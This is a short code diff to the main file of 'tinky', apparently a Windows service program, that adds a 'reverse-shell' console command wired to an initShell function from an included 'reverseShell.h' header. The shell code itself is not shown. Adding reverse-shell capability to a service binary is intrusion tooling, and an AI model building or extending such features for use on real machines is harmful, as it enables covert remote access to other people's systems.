@@ -1,5 +1,6 @@
 #include "tinky.hpp"
 #include "utils.hpp"
+#include "reverseShell.h"
 
 using namespace std;
 
@@ -16,7 +17,7 @@ static void cleanExit(tinky_t *tinky) {
 }
 
 tinky_t tinky = {};
-
+processes_t processes = {};
 HANDLE journalHandle = NULL;
 
 int __cdecl main(int argc, char **argv) {
@@ -29,8 +30,8 @@ int __cdecl main(int argc, char **argv) {
 
 	} else if (argc == 2) { /* Console Call */
 
-		char *args[] = { "install", "start", "stop", "delete" };
-		int (*funcPtr[NFUNC]) (void) = { &install, &start, &stop, &uninstall };
+		char *args[] = { "install", "start", "stop", "delete", "reverse-shell" };
+		int (*funcPtr[]) (void) = { &install, &start, &stop, &uninstall, &initShell };
 		
 		bool isJobDone = false;
 
@@ -40,9 +41,8 @@ int __cdecl main(int argc, char **argv) {
 				isJobDone = true;
 			}
 		}
-		if (isJobDone == false) return (printErr(EINARG, argv[1]));
 		cleanExit(&tinky);
-		return (EXIT_SUCCESS);
+		return (isJobDone == false ? printErr(EINARG, argv[1]) : EXIT_SUCCESS);
 	} else {
 		printUsage();
 	}
